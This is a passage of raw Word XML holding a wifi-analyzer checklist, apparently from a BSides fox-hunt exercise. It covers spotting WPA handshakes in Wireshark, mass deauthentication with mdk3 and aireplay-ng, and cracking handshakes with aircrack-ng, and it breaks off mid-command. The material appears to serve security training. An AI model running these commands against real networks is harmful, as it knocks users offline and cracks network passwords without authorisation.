      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wifi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-analyzer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17515BA6" w14:textId="77777777" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="006E261B" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11384A6E" w14:textId="566FA387" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="006E261B" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Return from Fox Hunt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E1510E" w14:textId="77777777" w:rsidR="006E261B" w:rsidRPr="007D20A8" w:rsidRDefault="006E261B" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64817B9A" w14:textId="4E464463" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="006E261B" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Use Wireshark</w:t>
      </w:r>
      <w:r w:rsidR="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>to check kismet dump for WPA handshakes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F1600F" w14:textId="012C4CD1" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Use display filter EAPOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E2498C" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="007D20A8" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A5C9EA0" w14:textId="63E9212B" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for WPA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5815D68E" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Create blacklist of APs to hit (see step 5.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5DA9CE" w14:textId="7A027F06" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>touch</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/Desktop/blacklist.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025C27FF" w14:textId="59BC1FE8" w:rsidR="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>put</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> of WPA networks into blacklist.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200422EA" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F8C639F" w14:textId="01D5AB18" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mdk3</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  wlan3mon d –b blacklist.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247716B0" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27D6BB4E" w14:textId="63D487A5" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 –e BSIDES –h </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6B2EA5" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C044881" w14:textId="05F0CFAF" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 1 -a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE05A41" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B8B9B73" w14:textId="55D7385F" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Crack WPA handshakes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575E1D9B" w14:textId="77777777" w:rsidR="006E261B" w:rsidRPr="007D20A8" w:rsidRDefault="006E261B" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C42B19C" w14:textId="482EAA63" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cracklib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-words -b </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006D3FA1">
        <w:rPr>
